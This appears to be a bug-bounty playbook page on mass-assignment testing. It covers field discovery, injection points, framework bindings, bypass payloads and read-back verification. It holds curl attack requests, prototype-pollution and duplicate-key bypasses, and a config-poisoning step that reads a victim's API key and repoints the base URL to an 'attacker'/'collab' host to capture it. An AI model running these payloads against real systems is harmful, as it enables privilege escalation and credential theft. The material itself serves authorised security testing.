# Moraa — Mass assignment / auto-binding (BOPLA write side)

> Load when the target has a write API (REST, form-encoded, or GraphQL) and you want to set fields the client never sends — roles, owners, prices, statuses. [[parameter-deep-dive]] § HPP carries the duplicate-parameter/type-confusion mechanics and the quick 6-line version; this doc is the deep reference.
> Read §1 before filing: mass-assignment findings get mis-filed against the read half of BOPLA, and the two halves need different proofs.

## 0. The one-minute version

```bash
curl -s -b "$C"  https://T/api/users/me > read.json                       # 1. what the server RETURNS
#                                                                          2. what the UI SENDS = body.json
curl -s -X PATCH https://T/api/users/me -b "$C" -H 'Content-Type: application/json' \
  -d '{"email":"me@x.tld","role":"admin","moraaCanary123":"x"}'          # 3. write + extra field + canary
curl -s -b "$C2" https://T/api/users/<MY-ID> | jq '{role,moraaCanary123}' # 4. read back as a SECOND account
```

GET the object. Diff its fields against what the PUT/POST body sends. Resend the write with the extra fields. GET again with a **second account** to confirm. The negative control (`moraaCanary123`) rides in the same request: it is what lets you tell "server honoured my field" apart from "server echoes every unknown key".

## 1. Where it sits (taxonomy — get this mapping right)

- **OWASP API Security Top 10 2019:** API6:2019 Mass Assignment.
- **OWASP API Security Top 10 2023:** that category was MERGED with API3:2019 Excessive Data Exposure into **API3:2023 Broken Object Property Level Authorization (BOPLA)**. Mass assignment is the WRITE half of BOPLA; excessive data exposure is the READ half. State which half you are reporting — these get mis-filed against each other and the two halves need different proofs. Source: https://api-security.owasp.org/editions/2023/en/0xa3-broken-object-property-level-authorization
- The three OWASP API3:2023 attack scenarios (paraphrased):
  1. A dating app's report endpoint returns sensitive fields (`fullName`, `recentLocation`) to users who should not read them. *(read half)*
  2. A marketplace host adds `total_stay_price` to a booking-request payload and changes what the guest is charged. *(write half — money)*
  3. A social-media user adds `blocked: false` to a video-update request and defeats content filtering. *(write half — internal flag)*
- **Alternative names by stack** — grep for all three when reading source: Rails / Node = "mass assignment"; Spring MVC and ASP.NET MVC = "autobinding"; PHP = "object injection". Source (OWASP Mass Assignment Cheat Sheet): https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html
- **The landmark case:** March 2012 — Egor Homakov added `<input value=USER_ID name=public_key[user_id]>` (USER_ID=4223, the rails org) to GitHub's public-key form. The backend ran `@key.update_attributes(params[:public_key])` with no whitelist, so his SSH key was bound to the rails/rails account and he got commit access. Sources: http://homakov.blogspot.com/2012/03/how-to.html and https://github.blog/2012-03-04-public-key-security-vulnerability-and-mitigation/

## 2. Discovery — finding the fields (this is the hard part)

### (a) The GET/PUT diff — the classic tell

```bash
curl -s -b "$C" https://T/api/users/me | jq -r 'paths(scalars)|join(".")' | sort > /tmp/read.keys
jq -r 'paths(scalars)|join(".")' body.json | sort > /tmp/write.keys
comm -23 /tmp/read.keys /tmp/write.keys     # readable but never written by the UI = your candidates
```

Fetch the object, fetch the write body the UI sends, diff the key sets. Fields present in the response but absent from the request are your candidates. Worked example (PortSwigger Web Security Academy, https://portswigger.net/web-security/api-testing): `PATCH /api/users/` sends only `username`+`email` while `GET /api/users/123` returns `id`, `name`, `email`, `isAdmin`. Lab: https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability — `chosen_discount` appears in the GET response but not in the POST body. Impact gate: the diff produces candidates, not findings — see §6 before calling anything.

### (b) JS bundles and source maps

```bash
# candidate field names out of every chunk
cat *.js | grep -oE '"[a-zA-Z_][a-zA-Z0-9_]{2,30}"\s*:' | tr -d '":' | sort -u > /tmp/bundle.fields
# TypeScript interfaces / DTO shapes, if a .js.map is served
curl -s https://T/assets/main.js.map | jq -r '.sourcesContent[]' | grep -nE 'interface [A-Z]|type [A-Z].*= \{' -A 20
```

The frontend constructs the request object; the type/model definition usually lists every field the API accepts. Cross-ref [[js-analysis]].

### (c) API docs / OpenAPI

```bash
for p in /openapi.json /swagger.json /v3/api-docs /api/swagger.json /api-docs /.well-known/openapi.json; do
  curl -s -o /dev/null -w "%{http_code} $p\n" -b "$C" "https://T$p"; done
curl -s https://T/openapi.json | jq -r '.components.schemas.User.properties | to_entries[] | "\(.key) readOnly=\(.value.readOnly)"'
```

The schema lists every property, including the ones the UI never sends. `readOnly: true` properties are the exact ones the server intends you not to set — that is the shortlist worth testing.

### (d) GraphQL introspection / error suggestions

```bash
curl -s https://T/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{__type(name:\"UpdateUserInput\"){inputFields{name type{name kind ofType{name}}}}}"}' | jq
```

Input object types name every settable field. When introspection is off, the "Did you mean ...?" suggestion in the error is a field oracle (clairvoyance rebuilds a schema from it). Cross-ref [[graphql]].

### (e) Mobile app bundles

```bash
apktool d target.apk -o out/ && grep -rhoE '"[a-zA-Z_][a-zA-Z0-9_]{2,30}"' out/ | sort -u | head -200
```

The mobile client is often a different, older, chattier client that sends fields the web UI dropped. Pull the APK and grep the same way. Cross-ref [[mobile-pentest]].

### (f) Framework error messages

Some stacks tell you outright. Rails in dev/test logs `Unpermitted parameters: :role` (config default `:log` in dev/test, `false` in production) and can be set to `:raise`. Laravel with `Model::preventSilentlyDiscardingAttributes` throws instead of silently dropping. A 500 or a verbose validation error that NAMES a field is free recon.

Sources: https://guides.rubyonrails.org/configuring.html (`config.action_controller.action_on_unpermitted_parameters`) and https://laravel.com/docs/12.x/eloquent#mass-assignment

### (g) Wordlists / automated param discovery

```bash
arjun -u https://T/api/users/me -m JSON --stable --headers "Cookie: $C"   # 25,890-name default dict
arjun -u https://T/api/users/me -m JSON --casing likeThis                 # re-run per naming convention
# x8: -b is a body TEMPLATE, %s is where each candidate param gets spliced in
x8 -u https://T/api/users/me -X PUT -b '{"email":"me@x.tld", %s}' -w params.txt
```

Last resort, noisy, but it finds the fields no other source names. Burp Param Miner guesses up to ~65,000 names per request via binary-search diffing. Sources: https://github.com/s0md3v/Arjun , https://github.com/Sh1Yo/x8 , https://github.com/PortSwigger/param-miner , https://swisskyrepo.github.io/PayloadsAllTheThings/Hidden%20Parameters/

## 3. Where to inject

| Injection point | What it looks like | When it works |
| --- | --- | --- |
| Top-level JSON key | `{"role":"admin"}` | The default case; always tried first |
| Nested object | `{"user":{"role":"admin"}}` | Filter checks the top level only; the binder descends |
| Array element | `{"items":[{"price":0}]}` | Per-line-item pricing; validators that check the container but not the elements |
| Bracket-notation form-encoded | `user[role]=admin` | The Rails/PHP shape — exactly what Homakov used; hits binders the JSON path never reaches |
| Flat form-encoded | `role=admin` | Non-JSON endpoints and legacy form handlers |
| Query string | `PUT /api/users/me?role=admin` | Many frameworks bind query + body into one model — ASP.NET and Spring both do |
| Multipart form field | file upload + extra form field | Under-tested: the upload handler often binds the whole form to a metadata model |
| GraphQL input variables | extra field inside the mutation's input object | Input types are whitelisted by schema, not by the resolver's wishes — see [[graphql]] |
| JSON-inside-a-string | `{"metadata":"{\"role\":\"admin\"}"}` | Server re-parses the string, often with a different, laxer parser than the outer one |
| Path-vs-body id conflict | `PUT /api/users/7` with `{"id":9}` | Which wins? If the body wins, you just moved the object |

## 4. High-value target fields, grouped by impact

Add the obvious camelCase/snake_case twins for every name listed.

### Role / privilege

| Fields | The win | Impact gate |
| --- | --- | --- |
| `role`, `roles`, `isAdmin`, `is_admin`, `admin`, `permissions`, `scopes`, `groups`, `groupId`, `accessLevel`, `userType`, `is_staff`, `is_superuser`, `privilege` | Become staff/admin, widen scopes | Real finding only if a SECOND account or a fresh session sees the elevated role AND you can then reach something you could not reach before. A `role` field echoed back in the response but not honoured by the authz layer is a shrug. |

### Ownership / tenancy

| Fields | The win | Impact gate |
| --- | --- | --- |
| `userId`, `user_id`, `ownerId`, `owner`, `tenantId`, `orgId`, `organization_id`, `accountId`, `workspaceId`, `teamId`, `customerId`, `merchantId` | Point the object at another user or tenant | Cross-tenant only counts when the object actually MOVES — it appears in the victim tenant's listing, or the victim's session can read/act on it. Cross-ref [[idor-access-control]]. |

### Money

| Fields | The win | Impact gate |
| --- | --- | --- |
| `price`, `unitPrice`, `amount`, `total`, `subtotal`, `discount`, `discountPercent`, `chosen_discount`, `currency`, `taxRate`, `shippingCost`, `balance`, `credits`, `quota`, `planId`, `subscriptionTier`, `trialEndsAt` | Pay less, hold more plan than you bought | The SERVER's own totals/balance response must change, and it must survive to the next step of the flow (re-price at checkout kills most of these). Cross-ref [[business-logic]]. |

### Workflow / state

| Fields | The win | Impact gate |
| --- | --- | --- |
| `status`, `state`, `approved`, `admin_approval`, `effective_status`, `isVerified`, `emailVerified`, `email_verified`, `phoneVerified`, `kycStatus`, `is_active`, `published`, `visibility`, `blocked`, `moderationState` | Skip review, verification, moderation | You must skip a control that costs the business something (payment, review, KYC, email ownership). A status flag you were allowed to set anyway is nothing. |

### Integrity / identity

| Fields | The win | Impact gate |
| --- | --- | --- |
| `id`, `uuid`, `slug`, `createdAt`, `updatedAt`, `createdBy`, `signature`, `hash`, `version`, `etag` | Rewrite history, collide objects | Usually Low alone. Report it when it enables something else — id collision, audit-log forgery, or an optimistic-lock bypass that unlocks a race. Cross-ref [[race-condition]]. |

## 5. Framework-specific exploitation

### Ruby on Rails — strong parameters

```ruby
# VULNERABLE:
params.require(:user).permit!               # docs: "Extreme care should be taken when using permit!, as it will allow all current and future model attributes to be mass-assigned"
params.require(:user).permit(profile: {})   # empty hash: ANY key inside that nested object passes
User.new(params[:user])                     # pre-Rails-4: no protection at all
# SAFE:
params.require(:user).permit(:name, :email)
```

Injection shape: bracket notation `user[role]=admin` and nested JSON. The nested-empty-hash case is the highest-yield modern Rails bug: the top level is locked down but one sub-object is wide open — always probe INSIDE `preferences`/`settings`/`metadata`/`profile` objects, not just the top level.
Fingerprint: `_<app>_session` cookie, `X-Request-Id`, `authenticity_token` in forms, `/rails/active_storage/` paths.
Source: https://guides.rubyonrails.org/action_controller_overview.html

### Laravel — $fillable / $guarded

```php
// VULNERABLE:
protected $guarded = [];            // "unguarding" — docs: you must then "always hand-craft the arrays passed to Eloquent's fill, create, and update methods"
User::create($request->all());      // same trap via $user->update($request->all()) and forceFill()
// SAFE:
protected $fillable = ['name','email'];
```

CRITICAL HUNTER NOTE, straight from the docs: "attributes that are not included in the `$fillable` array are **silently discarded**". On Laravel a 200 OK proves nothing at all — only a read-back distinguishes applied from discarded. This is the single biggest source of false-positive mass-assignment reports. Also: `$fillable` entries can name JSON sub-paths (`'options->enabled'`), so nested JSON keys are in scope on Laravel too.
Fingerprint: `laravel_session` / `XSRF-TOKEN` cookies, `/storage/` paths, Ignition error page.
Source: https://laravel.com/docs/12.x/eloquent#mass-assignment

### Django — ModelForm / DRF ModelSerializer

```python
# VULNERABLE:
class Meta:
    model = User
    fields = '__all__'    # or: exclude = [...] instead of fields
# SAFE:
fields = ['name','email']   # plus read_only_fields on DRF serializers
```

Django's own docs: "It is strongly recommended that you explicitly set all fields ... Failure to do so can easily lead to security problems when a form unexpectedly allows a user to set certain fields, especially when new fields are added to a model", and the include-everything approach "is known to be much less secure and has led to serious exploits on major websites (e.g. GitHub)".
The `exclude` variant is the one to hunt: safe the day it is written, vulnerable the day someone adds a column. On a Django target, test fields that look NEW (feature-flag names, recently shipped features).
Fingerprint: `csrftoken` / `sessionid` cookies, `/admin/` login page, DRF browsable API.
Source: https://docs.djangoproject.com/en/5.2/topics/forms/modelforms/

### Spring MVC — @ModelAttribute / DataBinder autobinding

```java
// VULNERABLE:
public String save(@ModelAttribute User user)   // the JPA entity bound directly
// SAFE:
@InitBinder
public void initBinder(WebDataBinder binder) {
    binder.setAllowedFields("userid","password","email"); // allow-list; OWASP also shows the weaker block-list form, binder.setDisallowedFields("isAdmin")
}
```

Injection shape: Spring binds query string AND form fields AND nested paths — `user.role=ADMIN`, `address.city=x`. Nested-path binding is the Spring-specific move.
The extreme case: **CVE-2022-22965 "Spring4Shell"** — data binding reached the ClassLoader through `class.module.classLoader.*` on JDK 9+, Spring Framework 5.3.0–5.3.17 and 5.2.19.RELEASE and earlier, exploitable to RCE when deployed as a WAR on Tomcat. Those are the preconditions; do not imply every Spring app is RCE-able. Source: https://spring.io/security/cve-2022-22965
Fingerprint: `JSESSIONID`, Whitelabel Error Page, `/actuator/` (cross-ref [[framework-misconfig]]).

### Express + Mongoose

```javascript
// VULNERABLE:
User.findOneAndUpdate({_id: req.params.id}, req.body)
Object.assign(user, req.body)
// SAFE:
const { name, email } = req.body   // pick fields explicitly
```

Mongoose's `strict` option is ON by default and silently strips paths not in the schema — your injected field only lands if it IS in the schema (i.e. `role` exists as a real field that the UI simply never sends). That is the common case and the more dangerous one. `{ strict: false }` on the schema removes the strip entirely. `strict` applies to updates too; `strictQuery` is a separate option governing only the query FILTER, and in Mongoose 7 it defaults to `false` — a loose filter is a NoSQLi surface, not a mass-assignment one; route it to [[nosql-ldap-xpath-injection]].
Source: https://mongoosejs.com/docs/guide.html#strict

### NestJS — DTO whitelisting

Vulnerable: `app.useGlobalPipes(new ValidationPipe())` with no options, or no pipe at all — extra properties pass straight through to the DTO and on to the ORM.
Safe: `new ValidationPipe({ whitelist: true, forbidNonWhitelisted: true })` — `whitelist` removes properties with no validation decorator; `forbidNonWhitelisted` rejects the request outright. That difference is a free oracle: unknown field gets a 400 naming it -> `forbidNonWhitelisted` is on, and you have just confirmed the field-name space; 200 and the field vanishes -> `whitelist` is on; 200 and the field sticks -> neither is on.
Source: https://docs.nestjs.com/techniques/validation

### ASP.NET MVC / Core — overposting

```csharp
// VULNERABLE:
public ActionResult Create(Student student)   // no binding restriction
// SAFE:
[Bind(Include = "LastName, FirstMidName, EnrollmentDate")]
TryUpdateModel(entity, "", new string[] { "LastName", "FirstMidName", "EnrollmentDate" }); // read entity first
// or bind to a view model and copy across explicitly
```

Microsoft's own tutorial spells out the attack: "Even if you don't have a `Secret` field on the web page, a hacker could use a tool such as fiddler, or write some JavaScript, to post a `Secret` form value ... whatever value the hacker specified for the `Secret` form field would be updated in your database."
MS prefers `Include` over `Exclude`: a newly added property is not automatically protected by an exclude list — same trap as Django's `exclude`. ASP.NET binds form, route AND query string into one model, so try the query string when the body is filtered.
Fingerprint: `.AspNetCore.Antiforgery.*` cookie, `__RequestVerificationToken`, `X-Powered-By: ASP.NET`.
Source: https://learn.microsoft.com/en-us/aspnet/mvc/overview/getting-started/getting-started-with-ef-using-mvc/implementing-basic-crud-functionality-with-the-entity-framework-in-asp-net-mvc-application

### Go — struct tags and ORM updates

`json.Unmarshal` / Gin's `c.ShouldBindJSON(&user)` binds every exported field that has a matching json tag; `json:"-"` is how a field is excluded. The hunt: a model struct used both as the DB row and as the request body.
GORM specifics that change your test design (https://gorm.io/docs/update.html):

```go
db.Model(&user).Updates(User{IsAdmin: false})  // struct: "will only update non-zero fields by default" — false, 0 and "" silently do nothing
db.Model(&user).Updates(map[string]interface{}{"is_admin": false})  // map: applies every key, zero values included
```

An attempt to set `isAdmin:false` or `price:0` through a struct-based update is a guaranteed false negative. Test with non-zero values first; if `price:0` fails, retry `price:0.01` before concluding the field is filtered.

## 6. Verification discipline — where mass-assignment reports die

The most important section. Every major stack's DEFAULT failure mode is a quiet 200. Six rules:

1. **A 200 is not a finding.** Rails silently drops unpermitted params, Laravel silently discards unfillable attributes, Mongoose silently strips non-schema paths, NestJS `whitelist` silently removes undecorated properties.
2. **Always read back with a separate GET**, not the write response. The write response is often the object you sent, echoed — client-side truth, not database truth.
3. **Always read back in a different session.** New token, or a second account that can see the object. This kills the "my own session caches the value I sent" illusion.
4. **Always send a negative control in the same request** (`"moraaCanary123":"x"`). If the canary also comes back in the read, the endpoint echoes arbitrary keys and you have proven nothing. If the canary disappears and your target field persists, the field is real.
5. **Prove the privilege, not the field.** For a role/permission field, the proof is reaching an endpoint that previously returned 403 — not the string `"admin"` in a profile response.
6. **Persist across a state change.** Re-fetch after logout/login, or after the next step in the flow. Many apps recompute the field server-side at the next transition and your "win" evaporates.

```bash
A="$(jq -r .a auth.json)"; B="$(jq -r .b auth.json)"   # two accounts
curl -s -X PATCH https://T/api/users/me -H "Authorization: Bearer $A" \
  -H 'Content-Type: application/json' \
  -d '{"email":"me@x.tld","role":"admin","moraaCanary123":"x"}' | jq -c . > /tmp/write.json
curl -s https://T/api/users/me   -H "Authorization: Bearer $A" | jq -c '{role,moraaCanary123}' > /tmp/self.json
curl -s https://T/api/users/<ID> -H "Authorization: Bearer $B" | jq -c '{role,moraaCanary123}' > /tmp/other.json
paste /tmp/write.json /tmp/self.json /tmp/other.json
# VERDICT: role sticks in self AND other, canary absent = real. canary present = echo, drop it.
```

Kill signals:

| Symptom | Verdict |
| --- | --- |
| Canary echoed back | Echo endpoint, not a finding |
| Field in write response but not in fresh GET | Echo, not a finding |
| Field persists but 403s unchanged | Field is decorative, Low at best |
| Field reverts after re-login | Recomputed server-side, not a finding |
| 400 naming your field | Whitelist active — but you just confirmed the field exists (recon win; see [[parameter-deep-dive]] on reading status codes) |

## 7. Bypasses when a whitelist exists

| Bypass | Payload | Why it can work |
| --- | --- | --- |
| Case variation | `Role` / `ROLE` / `isadmin` | Filters that compare exact strings; parsers that bind case-insensitively (Go's encoding/json matches field names case-insensitively by default; ASP.NET model binding is case-insensitive too) |
| Naming-convention twin | `is_admin` vs `isAdmin` vs `IsAdmin` | Gateway blocklist written in one convention, in front of a backend that normalises to the other |
| Nesting | `{"profile":{"role":"admin"}}` or `{"user":{"user":{"role":"admin"}}}` | Top level filtered, the nested object is not — the Rails `permit(profile: {})` case |
| Array wrapping | `{"role":["admin"]}` / `{"roles":[{"name":"admin"}]}` | Type coercion past a string-only check |
| Duplicate keys | `{"role":"user","role":"admin"}` | Last-wins vs first-wins differential between the validating parser and the persisting parser. Cross-ref [[parameter-deep-dive]] § HPP |
| Location split | field in the query string when the body is filtered | Spring and ASP.NET bind both |
| Content-type swap | same fields as `application/x-www-form-urlencoded` or `multipart/form-data` when the JSON path is guarded | Different binder, different rules |
| `__proto__` / `constructor.prototype` / `constructor[prototype]` | deep-merge payload | Not mass assignment itself but the same injection point; if the object is merged with a deep-merge you may pollute instead of assign. Cross-ref [[prototype-pollution]] |
| JSON parser differentials | trailing junk, unicode escapes in key names (`\u0072ole`), BOM, big integers | The WAF/validator and the app may not be the same parser |

**Impact gate for this whole section:** a bypass is only interesting if the FIELD it smuggles is one of §4. Bypassing a filter to set a harmless field is a curiosity.

## 8. Proven-in-the-wild references

| Case | What was injected | Impact | Source |
| --- | --- | --- | --- |
| GitHub / rails, Mar 2012 | `public_key[user_id]=4223` added to the SSH-key form | attacker's key bound to the rails org -> commit access to every rails/rails repo | http://homakov.blogspot.com/2012/03/how-to.html |
| Reddit Ads (H1 #1543159, $5,000, High) | `PATCH /api/v2.0/accounts/<id>/ads/<id>` with body `{"data":{"configured_status":"ACTIVE","effective_status":"ACTIVE","admin_approval":"APPROVED"}}` | self-approved own ad past human review and without payment details; reddit sent the "approved" confirmation email | https://hackerone.com/reports/1543159 |
| Uber partners (H1 #99424, $1,000) | driver re-enabled and submitted the `first_name`/`last_name` fields the UI hid after onboarding | post-vetting identity change on a background-checked driver account | https://hackerone.com/reports/99424 |
| PortSwigger Academy lab | `chosen_discount` — present in `GET` response, absent from the `POST` body | buy an item below price | https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability |

The Reddit case is the template to imitate: a workflow/status field on an internal-facing admin property, discovered by diffing the GET against the PATCH.

## 9. Cross-references

- [[parameter-deep-dive]] — the per-parameter 20-class matrix; mass assignment is row 17 there, this doc is the depth. Its § HPP also holds the duplicate-key/array/type-confusion mechanics and the 6-line quick version of this doc.
- [[idor-access-control]] — once the injected field is an owner/tenant id it becomes an IDOR and the two-account proof bar applies.
- [[business-logic]] — once the field is price/quantity/discount: negative quantities, currency confusion, coupon logic.
- [[graphql]] — mutation input objects, nested resolvers, introspection for input field names.
- [[prototype-pollution]] — `__proto__` at the same injection point.
- [[js-analysis]] — mining bundles and source maps for field names.
- [[framework-misconfig]] — actuator/source-map/stack-trace leaks that hand you the model shape.
- [[validate]] — run the gate before writing this up.

## The partial-write trap: a re-constructed model WIPES omitted fields

Before building a config-poisoning payload, settle what the handler does with the
fields you leave out. Two shapes that look identical from outside:

| Handler shape | Omitted field becomes |
|---|---|
| `obj.update(form_data)` / `setattr` per key / `PATCH` semantics | **preserved** — a single-field write is enough |
| `Model(**form_data)` then assign, or `Model.model_validate(body)` | **reset to the field default** — a single-field write silently blanks everything else |

The second shape makes the obvious attack **self-defeating**, and it fails
*silently* with a 200. Measured case — `open-webui/pipelines`:

```python
valves = ValvesModel(**form_data)      # re-constructed, NOT merged
pipeline.valves = valves
```

Sending only `{"OPENAI_API_BASE_URL": "http://attacker"}` returned **200** and set
`OPENAI_API_KEY` to `""`. The consumer then opens with
`if self.valves.OPENAI_API_KEY:` — falsy — so no outbound request is made and
**nothing egresses**. The payload "worked" and achieved nothing.

**So: read the current config first, then replay every field with only the one you
want changed.** If a sibling read route exists and is reachable, that read is the
load-bearing primitive, not the write:

```bash
# 1. read the live values (often the SAME authz gap as the write)
curl -s "https://$T/$ID/valves"            # -> {"BASE_URL":"...","API_KEY":"sk-..."}
# 2. replay ALL fields, poisoning only the one you want
curl -s -X POST "https://$T/$ID/valves/update" -H 'Content-Type: application/json' \
  -d '{"BASE_URL":"http://collab","API_KEY":"<the key you just read>"}'
```

> **Proof gate.** A 200 on the write proves nothing here. Read the object back and
> diff it against what you sent: the fields you omitted tell you which shape you are
> facing. Then prove the *sink* — catch the credential arriving on your collector —
> not the stored value.

Corollary for the **defensive** read: a handler of the second shape is also a
denial/data-loss primitive on its own. Any unauthenticated caller can blank a
victim's whole configuration with one partial write.


---

## The silent-200: an accepted write that changes nothing

The commonest false positive in this class is a `200` on a write you did not expect to be allowed.
A permissive-looking handler often **accepts the whole body and then ignores the fields it does not
own**, so status code and effect disagree.

Worked example. A workspace object carried the module-federation config of the SPA that renders it —
`publicPath`, `remoteEntry`, `apiUrlBase`, i.e. **the URL the app's own origin loads JavaScript
from**. Writable, that is script execution in the app origin and therefore ATO, so the ceiling was
Critical. Four body shapes were sent, including a camelCase variant:

| Body | Status | Field after read-back |
|---|---|---|
| `{"name":"<current>"}` (control) | 200 | — |
| `{"name":…,"web_configs":{"version":"X-canary"}}` | **200** | **unchanged** |
| `{"name":…,"web_configs":{…full object…,"version":"X-canary"}}` | **200** | **unchanged** |
| `{"name":…,"webConfigs":{"version":"X-canary"}}` | **200** | **unchanged** |

Every write returned 200 with a full object in the response body. Reported on status alone this is a
Critical mass-assignment finding. It is nothing: the field is server-controlled and silently
dropped. **The read-back is the entire finding.**

### Rules

1. **Never grade a mass-assignment probe on its status code.** Re-read the object and diff the
   specific field. "Accepted" and "applied" are different facts.
2. **Send a control body that changes only a field you KNOW is writable** (here, `name` held at its
   current value). If the control does not return 200, the handler is unreachable and your other
   results mean nothing — you are measuring validation, not authorization.
3. **Pick an inert marker.** Bump a version string or a display name, not the dangerous field
   itself. Proving the object accepts a tenant write is sufficient to establish the finding;
   repointing a live `publicPath` breaks the app for real users and adds no evidence. On an estate
   with a "that it resolved IS the finding" rule, that is also the required discipline.
4. **Respect the field's own validation order.** The first attempt here omitted the object's
   required `name` and drew `400 invalid name format`, which was misread as "not writable". A 4xx
   naming a *parameter* has not answered the question — see `idor-access-control.md` on finishing
   the body before reading the verdict.
5. **Say what you have NOT shown.** An unreachable-from-the-tenant field may still be writable from
   an internal or admin path, and a field that is silently dropped today may be bound tomorrow.
   Write the negative as "not writable from a tenant principal", not "not writable".
